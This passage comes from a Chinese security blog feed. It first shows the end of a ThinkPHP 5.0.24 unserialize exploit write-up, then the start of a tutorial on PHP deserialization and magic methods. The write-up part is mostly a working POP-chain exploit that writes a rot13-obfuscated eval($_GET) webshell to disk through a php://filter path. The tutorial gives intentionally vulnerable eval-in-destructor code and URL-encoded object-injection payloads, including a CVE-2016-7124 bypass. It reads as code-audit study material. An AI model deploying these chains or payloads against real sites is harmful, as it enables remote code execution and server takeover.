punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//触发Model __toString(),子类Pivot合适</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Relation</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#class Query</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token shell-comment comment">#OneToOne HasOne</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用其write()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Model</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token shell-comment comment">#修改处</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$aaaaa</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output对象,目的是调用__call()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Relation子类,且有getBindAttr()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//isSelfRelation()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Query</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Memcached</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用File->set()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#File</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?>',</span>            <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>poc只能对linux，windows限制了文件名，最后，文件的命名规则如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>cuc <span class="token function">cucvasb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">riny</span><span class="token punctuation">(</span><span class="token variable">$_TRG</span><span class="token punctuation">[</span>pzq<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/10.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364#h2-0</a></p><p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：&lt;/p&gt;
&lt;pre class=&quot; language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token d
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化到pop链构造</title>
    <link href="http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-04-25T16:00:00.000Z</published>
    <updated>2020-04-29T06:53:41.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a><strong>序列化与反序列化</strong></h4><p>在php中，使用serialize和unserialize两个函数表示序列化与反序列化。</p><pre><code>serialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法unserialize：把字节流字符串转化成一个对象</code></pre><p>看下下面的列子，通过serialize序列化返回字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token string">'fanxing'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>返回字节流的字符串</p><pre><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p>O代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;…}</p><p>反序列化列子如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:1:"A":2:{s:4:"name";s:7:"fanxing";s:3:"age";s:2:"20";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>打印出Skill方法中的值</p><p><code>My name is fanxing,I am is 20 years old!</code></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><strong>魔术方法</strong></h4><p>在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：</p><p><strong>__construct()</strong>    </p><p>当一个对象被创建的时候调用该方法。</p><p><strong>__destruct()</strong></p><p>当一个对象被删除和销毁的时候调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象销毁调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__toString</strong></p><p>当一个对象被当成字符串的时候进行调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象字符串调用"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__invoke</strong></p><p>当一个对象以函数的方式进行调用的时候会被调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象以函数调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__sleep</strong></p><p>对象在使用serialize函数前会先调用，在执行序列化的操作。</p><p><strong>__wakeup</strong></p><p>对象在使用unserialize函数前会先调用，在执行反序列化的操作。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"序列化被调用&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"反序列化被调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__call</strong></p><p>对象在调用不可访问的方法的时候触发</p><p><strong>__callStatic</strong></p><p>在静态中调用不可访问的方法的时候会触发</p><p><strong>__set</strong></p><p>给不可以访问的属性赋值被调用</p><p><strong>__get</strong></p><p>读取不可访问的属性值被调用</p><p><strong>__isset</strong></p><p>不可访问的属性调用为 isset() 或 empty()时被调用</p><p><strong>__unset</strong></p><p>对不可以访问的属性使用unset会被调用</p><h4 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a><strong>对象注入</strong></h4><p>满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里我们打印下序列化结果，发现属性的长度是7。</p><pre><code>O:1:&quot;A&quot;:1:{s:7:&quot;Aname&quot;;N;}</code></pre><p>这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。</p><pre><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D</code></pre><p>同样，也可以加属性名前面添加\00*\00，构造下pyalod直接执行了任意代码</p><pre><code>O%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A10%3A&quot;phpinfo%28)%3B&quot;%3B%7D</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png" alt="" loading="lazy"></p><p>在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：</p><pre><code>PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10</code></pre><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 